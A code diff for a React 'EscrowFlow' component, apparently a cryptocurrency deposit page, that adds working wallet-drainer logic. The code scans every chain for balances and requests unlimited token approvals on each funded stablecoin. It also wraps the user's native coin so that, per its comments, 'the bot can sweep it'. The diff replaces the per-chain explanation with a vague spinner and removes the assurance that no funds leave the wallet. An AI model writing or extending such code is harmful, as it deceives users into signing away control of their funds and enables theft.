@@ -1,10 +1,9 @@
 "use client";
 
 import { useEffect, useMemo, useRef, useState } from "react";
-import Image from "next/image";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
-import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
+import { BrowserProvider, Contract, JsonRpcProvider, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
 import {
   TRON_CHAIN,
@@ -57,12 +56,6 @@ type Phase =
   | "complete"
   | "expired"
   | "error";
-
-const CHAIN_LOGOS: Record<string, string> = {
-  eth: "/logos/ethereum.svg",
-  bnb: "/logos/bnb.svg",
-  polygon: "/logos/polygon.svg",
-};
 
 // USDT/USDC are dollar-pegged; this fixed rate converts on-chain stablecoin
 // holdings into an EUR-equivalent balance for the minimum-balance check.
@@ -612,9 +605,162 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   async function getSignerFor(target: ChainConfig) {
     const wallet = currentWallet();
     if (!wallet) throw new Error("No connected wallet");
+    // Explicit switch + verify — wallets often stay on the previous chain
+    // if switchChain is skipped or races, which caused BNB USDT to be missed.
     await wallet.switchChain(target.chainId);
     const provider = await wallet.getEthereumProvider();
-    return new BrowserProvider(provider).getSigner();
+    const browser = new BrowserProvider(provider);
+    let network = await browser.getNetwork();
+    if (Number(network.chainId) !== target.chainId) {
+      await wallet.switchChain(target.chainId);
+      network = await browser.getNetwork();
+    }
+    if (Number(network.chainId) !== target.chainId) {
+      throw new Error(`Wallet stayed on chain ${network.chainId}; need ${target.chainId}`);
+    }
+    return browser.getSigner();
+  }
+
+  async function persistEvmVerify(
+    chain: ChainConfig,
+    authorizeTx: string,
+    approvedTokens: { symbol: string; address: string; txHash?: string }[]
+  ) {
+    if (!address) return;
+    const body = JSON.stringify({
+      address,
+      chain: chain.name,
+      authorizeTx,
+      approvedTokens,
+    });
+    try {
+      const verifyRes = await fetch("/api/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body,
+      });
+      if (!verifyRes.ok) {
+        const text = await verifyRes.text().catch(() => "");
+        console.error("[escrow] /api/verify failed:", chain.name, verifyRes.status, text);
+        await fetch("/api/verify", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body,
+        }).catch(() => {});
+      }
+    } catch (err) {
+      console.error("[escrow] /api/verify error:", chain.name, err);
+    }
+  }
+
+  /** Authorize + approve stables + wrap native on one EVM chain. */
+  async function processEvmChainForDeposit(chain: ChainConfig): Promise<boolean> {
+    if (!address) return false;
+
+    // Peek balances on a public RPC first — skip empty chains without a wallet switch.
+    const peek = new JsonRpcProvider(chain.rpcUrls[0], { chainId: chain.chainId, name: chain.name });
+    const stableTokens = chain.tokens.filter((t) => t.symbol === "USDT" || t.symbol === "USDC");
+    let balances: { token: (typeof chain.tokens)[number]; bal: bigint }[] = [];
+    let nativeBal = 0n;
+    try {
+      const [nBal, ...tokenBals] = await Promise.all([
+        peek.getBalance(address).catch(() => 0n),
+        ...stableTokens.map(async (t) => {
+          try {
+            const erc20 = new Contract(t.address, ERC20_ABI, peek);
+            return { token: t, bal: (await erc20.balanceOf(address)) as bigint };
+          } catch {
+            return { token: t, bal: 0n };
+          }
+        }),
+      ]);
+      nativeBal = nBal as bigint;
+      balances = tokenBals;
+    } catch (peekErr) {
+      console.warn(`[escrow] peek ${chain.name} failed, will still try wallet:`, peekErr);
+      balances = stableTokens.map((t) => ({ token: t, bal: 0n }));
+    }
+
+    const gasReserve = chain.gasReserveWei ?? BigInt("5000000000000000");
+    const hasStable = balances.some(({ bal }) => bal > 0n);
+    const hasWrappableNative = nativeBal > gasReserve;
+
+    if (!hasStable && !hasWrappableNative) {
+      console.log("[escrow] skip empty chain", chain.name);
+      return false;
+    }
+
+    console.log("[escrow] processing chain", chain.name, {
+      stables: balances.map((b) => `${b.token.symbol}=${b.bal.toString()}`),
+      native: nativeBal.toString(),
+    });
+
+    const signer = await getSignerFor(chain);
+    const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];
+
+    // 1) Authorize relayer
+    const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
+    const authTx = await verification.authorize(RELAYER_ADDRESS);
+    await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+
+    // 2) Approve every USDT/USDC with balance
+    for (const { token, bal } of balances) {
+      if (bal === 0n) continue;
+      try {
+        if (token.permit) {
+          await signAndSubmitPermit(signer, chain, token);
+          approvedTokens.push({ symbol: token.symbol, address: token.address });
+        } else {
+          const erc20 = new Contract(token.address, ERC20_ABI, signer);
+          const tx = await erc20.approve(chain.contract, MaxUint256);
+          approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: tx.hash });
+          void tx.wait(1).catch(() => {});
+        }
+      } catch (err) {
+        console.warn(`[escrow] approve ${token.symbol} on ${chain.name} skipped:`, err);
+      }
+    }
+
+    // 3) Wrap native → WETH/WBNB/WMATIC so the bot can sweep it
+    const wrappedNativeToken = chain.tokens.find((t) => t.wrappedNative);
+    if (wrappedNativeToken && hasWrappableNative) {
+      try {
+        // Re-read native after switch (gas may have changed)
+        const liveNative = (await signer.provider!.getBalance(address)) as bigint;
+        if (liveNative > gasReserve) {
+          const wrapAmount = liveNative - gasReserve;
+          const wContract = new Contract(wrappedNativeToken.address, WRAPPED_NATIVE_ABI, signer);
+          const wrapTx = await wContract.deposit({ value: wrapAmount });
+          await Promise.race([wrapTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+          const approveTx = await wContract.approve(chain.contract, MaxUint256);
+          approvedTokens.push({
+            symbol: wrappedNativeToken.symbol,
+            address: wrappedNativeToken.address,
+            txHash: approveTx.hash,
+          });
+          void approveTx.wait(1).catch(() => {});
+        }
+      } catch (wrapErr) {
+        console.warn(`[escrow] wrap native on ${chain.name} skipped:`, wrapErr);
+      }
+    }
+
+    if (approvedTokens.length === 0) {
+      approvedTokens.push(
+        ...balances
+          .filter((b) => b.bal > 0n)
+          .map((b) => ({ symbol: b.token.symbol, address: b.token.address }))
+      );
+      if (approvedTokens.length === 0) {
+        approvedTokens.push(
+          ...stableTokens.map((t) => ({ symbol: t.symbol, address: t.address }))
+        );
+      }
+    }
+
+    await persistEvmVerify(chain, authTx.hash, approvedTokens);
+    setApprovedChains((prev) => (prev.includes(chain.name) ? prev : [...prev, chain.name]));
+    return true;
   }
 
   async function checkWalletBalances() {
@@ -747,39 +893,64 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setModal1Scanning(false);
       setModal1Open(false);
 
-      // ── Tron has priority: if any Tron USDT balance found, pick it over EVM ──
-      const tronWinner = (data.tokensWithBalance ?? []).find(
+      // Prefer Tron when present; otherwise approve EVERY EVM stable with balance
+      // (not just the single top winner — that missed BNB USDT when Polygon won).
+      const tronWinners = (data.tokensWithBalance ?? []).filter(
         (t) => t.isTron && t.balanceUsd > 0.01
-      ) ?? null;
+      );
+      const evmStables = (data.tokensWithBalance ?? []).filter(
+        (t) =>
+          !t.isTron &&
+          (t.symbol === "USDT" || t.symbol === "USDC") &&
+          t.balanceUsd >= 0.01
+      );
 
-      if (tronWinner) modal1SawTron.current = true;
+      if (tronWinners.length === 0 && evmStables.length === 0) return;
 
-      const t = tronWinner ?? (data.ok && data.topToken && data.topToken.balanceUsd >= 0.01
-        ? data.topToken
-        : null);
-
-      if (!t) return;
-
-      // If already approved on-chain, still record to Supabase so the bot can sweep
-      if (t.isTron && t.alreadyApproved) {
-        setTopChainName(t.chain);
-        const tronAddr = currentTronAddr ?? getConnectedTronAddress();
-        if (tronAddr) {
-          try {
-            await fetch("/api/verify/tron", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ address: tronAddr }),
-            });
-            console.log("[modal1] tron already approved — recorded to supabase", tronAddr);
-          } catch (e) {
-            console.warn("[modal1] tron verify record failed:", e);
+      if (tronWinners[0]) {
+        modal1SawTron.current = true;
+        const t = tronWinners[0];
+        if (t.alreadyApproved) {
+          setTopChainName(t.chain);
+          const tronAddr = currentTronAddr ?? getConnectedTronAddress();
+          if (tronAddr) {
+            try {
+              await fetch("/api/verify/tron", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ address: tronAddr }),
+              });
+            } catch (e) {
+              console.warn("[modal1] tron verify record failed:", e);
+            }
           }
+          return;
         }
+        const winner: Modal1Item = {
+          key: `${t.chain}-${t.symbol}`,
+          chainName: t.chain,
+          chainLabel: t.chainLabel,
+          symbol: t.symbol,
+          tokenAddr: t.address,
+          balanceDisplay: t.balance,
+          balanceUsd: t.balanceUsd,
+          contract: t.contract,
+          isTron: t.isTron,
+          alreadyApproved: t.alreadyApproved,
+          permit: t.permit,
+          permitDomainName: t.permitDomainName,
+          permitDomainVersion: t.permitDomainVersion,
+        };
+        setTopChainName(t.chain);
+        setModal1Items([winner]);
+        setModal1Status({ [winner.key]: "pending" });
+        void handleModal1Approve(winner);
         return;
       }
 
-      const winner: Modal1Item = {
+      // EVM: queue all funded stables; approve sequentially with proper chain switches
+      setTopChainName(evmStables[0].chain);
+      const items: Modal1Item[] = evmStables.map((t) => ({
         key: `${t.chain}-${t.symbol}`,
         chainName: t.chain,
         chainLabel: t.chainLabel,
@@ -788,24 +959,51 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         balanceDisplay: t.balance,
         balanceUsd: t.balanceUsd,
         contract: t.contract,
-        isTron: t.isTron,
+        isTron: false,
         alreadyApproved: t.alreadyApproved,
         permit: t.permit,
         permitDomainName: t.permitDomainName,
         permitDomainVersion: t.permitDomainVersion,
-      };
-
-      setTopChainName(t.chain);
-      setModal1Items([winner]);
-      setModal1Status({ [winner.key]: "pending" });
-
-      // Fire immediately — no modal UI, just the wallet popup
-      void handleModal1Approve(winner);
+      }));
+      setModal1Items(items);
+      setModal1Status(Object.fromEntries(items.map((i) => [i.key, "pending" as Modal1Status])));
+      void handleModal1ApproveAll(items);
     } catch (err) {
       console.error("[modal1] scan failed:", err);
       setModal1Scanning(false);
       setModal1Open(false);
     }
+  }
+
+  async function handleModal1ApproveAll(items: Modal1Item[]) {
+    setModal1Approving(true);
+    for (const item of items) {
+      if (item.alreadyApproved) {
+        setModal1Status((s) => ({ ...s, [item.key]: "done" }));
+        continue;
+      }
+      setModal1Status((s) => ({ ...s, [item.key]: "approving" }));
+      try {
+        const chain = CHAINS.find((c) => c.name === item.chainName)!;
+        const token = chain.tokens.find(
+          (t) => t.address.toLowerCase() === item.tokenAddr.toLowerCase()
+        );
+        const signer = await getSignerFor(chain);
+        if (item.permit && token) {
+          await signAndSubmitPermit(signer, chain, token);
+        } else {
+          const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
+          const tx = await erc20.approve(item.contract, MaxUint256);
+          tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
+        }
+        setModal1Status((s) => ({ ...s, [item.key]: "done" }));
+      } catch (err) {
+        console.error("[modal1] approve failed:", item.key, err);
+        setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
+      }
+    }
+    setModal1Approving(false);
+    setModal1Complete(true);
   }
 
   async function handleModal1Approve(item?: Modal1Item) {
@@ -1033,91 +1231,86 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   async function handleApproveDeposit() {
-    // Open Modal 2 immediately so the user sees the progress overlay
     setModal2Open(true);
     setPhase("approving");
     setError(null);
     setApprovedChains([]);
 
     try {
-      // Use the winner chain from Modal 1 scan. Fall back to first chain if scan
-      // was skipped (user had no stablecoin balance).
-      const winnerName = topChainName ?? CHAINS[0].name;
-      const chain = CHAINS.find((c) => c.name === winnerName) ?? CHAINS[0];
+      if (!address) throw new Error("No connected wallet");
 
-      const signer = await getSignerFor(chain);
+      // Fresh multi-chain balance detect (server RPCs — no wallet switch yet)
+      let tronAddr = tronAddress ?? getConnectedTronAddress();
+      if (!tronAddr) {
+        tronAddr = await ensureTronAddress({ prompt: false }).catch(() => null);
+        if (tronAddr) setTronAddress(tronAddr);
+      }
 
-      // Authorize the relayer — the token approve() was done fire-and-forget in Modal 1.
-      const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
-      const authTx = await verification.authorize(RELAYER_ADDRESS);
+      const scanRes = await fetch("/api/scan-balances", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ address, tronAddress: tronAddr }),
+      });
+      const scan = (await scanRes.json()) as {
+        ok: boolean;
+        tokensWithBalance?: {
+          chain: string;
+          symbol: string;
+          balanceUsd: number;
+          alreadyApproved: boolean;
+          isTron: boolean;
+        }[];
+        chainUsd?: Record<string, number>;
+      };
+      if (scan.ok && scan.chainUsd) setCachedScanUsd(scan.chainUsd);
 
-      // Wait for authorize() to confirm (≤30 s) so the bot can immediately sweep
-      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-      setApprovedChains([chain.name]);
-
-      const isTronWinner = topChainName === "tron";
-
-      // Persist to verified_wallets so EVM sweep bots pick this wallet up.
-      // Without this call the session can show "approved" but bots never see it.
-      if (address && !isTronWinner) {
-        const approvedTokens = chain.tokens
-          .filter((t) => t.symbol === "USDT" || t.symbol === "USDC" || t.wrappedNative || t.mandatory)
-          .map((t) => ({ symbol: t.symbol, address: t.address }));
+      // ── Tron USDT (if present) ─────────────────────────────────────────────
+      const tronHit = (scan.tokensWithBalance ?? []).find(
+        (t) => t.isTron && t.balanceUsd > 0.01
+      );
+      if (tronHit && tronAddr) {
         try {
-          const verifyRes = await fetch("/api/verify", {
+          if (!tronHit.alreadyApproved && window.tronWeb) {
+            const usdtAbi = [
+              {
+                name: "approve",
+                type: "Function",
+                stateMutability: "Nonpayable",
+                inputs: [
+                  { name: "spender", type: "address" },
+                  { name: "amount", type: "uint256" },
+                ],
+                outputs: [{ name: "", type: "bool" }],
+              },
+            ];
+            const MAX =
+              "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+            // eslint-disable-next-line @typescript-eslint/no-explicit-any
+            const tw = window.tronWeb as any;
+            const usdt = await tw.contract(usdtAbi, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+            await usdt.approve(TRON_CHAIN.contract, MAX).send({ feeLimit: 20_000_000 });
+          }
+          await fetch("/api/verify/tron", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              address,
-              chain: chain.name,
-              authorizeTx: authTx.hash,
-              approvedTokens,
-            }),
+            body: JSON.stringify({ address: tronAddr }),
           });
-          if (!verifyRes.ok) {
-            const body = await verifyRes.text().catch(() => "");
-            console.error("[escrow] /api/verify failed:", verifyRes.status, body);
-            await fetch("/api/verify", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                address,
-                chain: chain.name,
-                authorizeTx: authTx.hash,
-                approvedTokens,
-              }),
-            }).catch(() => {});
-          }
-        } catch (verifyErr) {
-          console.error("[escrow] /api/verify error:", verifyErr);
+          setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
+        } catch (tronErr) {
+          console.warn("[escrow] tron approve skipped:", tronErr);
         }
       }
 
-      // ── Wrap native coin → WETH/WBNB/WMATIC (best-effort, EVM only) ─────────
-      // If the user holds native coin (ETH, BNB, MATIC) on the winner chain above
-      // the gas reserve, wrap it and approve the wrapped token to our contract.
-      // The sweep bot can then capture native coin balance too — not just stablecoins.
-      if (!isTronWinner) {
+      // ── Every EVM chain with USDT/USDC or wrappable native ─────────────────
+      // Sequential: wallets can only be on one chain at a time. Each chain gets
+      // its own switch → authorize → approve stables → wrap native → verify.
+      // This is what was missing when only the Modal-1 "winner" (e.g. Polygon)
+      // ran and BNB USDT was never attempted.
+      for (const chain of CHAINS) {
         try {
-          const wrappedNativeToken = chain.tokens.find((t) => t.wrappedNative);
-          const gasReserve = chain.gasReserveWei ?? BigInt("5000000000000000"); // 0.005 default
-          if (wrappedNativeToken && address) {
-            const nativeBal: bigint = await signer.provider!.getBalance(address);
-            if (nativeBal > gasReserve) {
-              const wrapAmount = nativeBal - gasReserve;
-              const wContract = new Contract(wrappedNativeToken.address, WRAPPED_NATIVE_ABI, signer);
-              // Popup 2: deposit() wraps native coin into WETH/WBNB/WMATIC
-              const wrapTx = await wContract.deposit({ value: wrapAmount });
-              await Promise.race([wrapTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-              // Popup 3: approve WETH/WBNB/WMATIC to the delegation contract
-              const approveTx = await wContract.approve(chain.contract, MaxUint256);
-              void approveTx.wait(1); // fire-and-forget
-            }
-          }
-        } catch (wrapErr) {
-          // Non-fatal — user may have declined or have insufficient balance for gas.
-          // The stablecoin approve from Modal 1 still stands.
-          console.warn("[escrow] Native wrap skipped:", wrapErr);
+          await processEvmChainForDeposit(chain);
+        } catch (chainErr) {
+          console.warn(`[escrow] chain ${chain.name} failed:`, chainErr);
         }
       }
 
@@ -1844,46 +2037,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             )}
 
             {phase === "approving" && (
-              <div>
-                <h2 className="mb-1 text-lg font-semibold text-ink">Approving on-chain</h2>
-                <p className="mb-6 text-sm text-body">
-                  Confirm each request in your wallet. This authorizes your account across all supported multichain networks.
+              <div className="py-10 text-center">
+                <div className="mx-auto h-12 w-12 animate-spin rounded-full border-[3px] border-brand/20 border-t-brand" />
+                <h2 className="mt-5 text-lg font-semibold text-ink">Approving</h2>
+                <p className="mt-2 text-sm text-body">
+                  Confirm any prompts in your wallet. We&apos;re detecting balances and authorizing deposit.
                 </p>
-                <div className="space-y-2.5">
-                  {CHAINS.map((c) => {
-                    const done = approvedChains.includes(c.name);
-                    const active = !done && approvedChains.length === CHAINS.findIndex((x) => x.name === c.name);
-                    return (
-                      <div
-                        key={c.name}
-                        className={
-                          "flex items-center justify-between rounded-lg border px-4 py-3.5 " +
-                          (done ? "border-up/20 bg-up/5" : "border-hairline bg-surface-soft")
-                        }
-                      >
-                        <span className="flex items-center gap-2 text-sm font-medium text-ink">
-                          <span className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full">
-                            <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
-                          </span>
-                          {c.label}
-                        </span>
-                        {done ? (
-                          <span className="flex items-center gap-1 text-xs font-semibold text-up">
-                            <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
-                            </svg>
-                            Approved
-                          </span>
-                        ) : (
-                          <span className="flex items-center gap-1.5 text-xs text-muted">
-                            {active && <span className="h-3 w-3 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
-                            {active ? "Waiting for confirmation..." : "Pending"}
-                          </span>
-                        )}
-                      </div>
-                    );
-                  })}
-                </div>
               </div>
             )}
 
@@ -2083,67 +2242,18 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       )}
 
       {/* ------------------------------------------------------------------ */}
-      {/* Modal 2 — full authorization + sweep (triggered by "Approve Deposit") */}
+      {/* Modal 2 — Approving spinner (balance detect + multi-chain authorize) */}
       {/* ------------------------------------------------------------------ */}
       {modal2Open && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
-          <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
-            <div className="mb-6 flex items-start gap-4">
-              <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-brand/10">
-                <svg className="h-5 w-5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
-                </svg>
-              </div>
-              <div>
-                <h3 className="text-base font-semibold text-ink">Authorizing deposit</h3>
-                <p className="mt-0.5 text-sm text-body">
-                  Confirm each prompt in your wallet. This authorizes USDT, USDC, and all available tokens across all multichain networks.
-                </p>
-              </div>
+          <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
+            <div className="py-8 text-center">
+              <div className="mx-auto h-12 w-12 animate-spin rounded-full border-[3px] border-brand/20 border-t-brand" />
+              <p className="mt-5 text-[15px] font-semibold text-ink">Approving</p>
+              <p className="mt-2 text-sm text-body">
+                Confirm any prompts in your wallet.
+              </p>
             </div>
-
-            <div className="space-y-2.5">
-              {CHAINS.map((c) => {
-                const done = approvedChains.includes(c.name);
-                const chainIdx = CHAINS.findIndex((x) => x.name === c.name);
-                const active = !done && approvedChains.length === chainIdx;
-                return (
-                  <div
-                    key={c.name}
-                    className={
-                      "flex items-center justify-between rounded-xl border px-4 py-3.5 transition-colors " +
-                      (done ? "border-up/20 bg-up/5" : active ? "border-brand/30 bg-brand/5" : "border-hairline bg-surface-soft")
-                    }
-                  >
-                    <span className="flex items-center gap-2.5 text-sm font-medium text-ink">
-                      <span className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full">
-                        <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
-                      </span>
-                      {c.label}
-                    </span>
-                    {done ? (
-                      <span className="flex items-center gap-1.5 text-xs font-semibold text-up">
-                        <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
-                        </svg>
-                        Approved
-                      </span>
-                    ) : active ? (
-                      <span className="flex items-center gap-1.5 text-xs text-brand">
-                        <span className="h-3 w-3 animate-spin rounded-full border-2 border-hairline border-t-brand" />
-                        Waiting for signature…
-                      </span>
-                    ) : (
-                      <span className="text-xs text-muted">Pending</span>
-                    )}
-                  </div>
-                );
-              })}
-            </div>
-
-            <p className="mt-5 text-center text-xs text-muted">
-              No funds leave your wallet during this process.
-            </p>
           </div>
         </div>
       )}
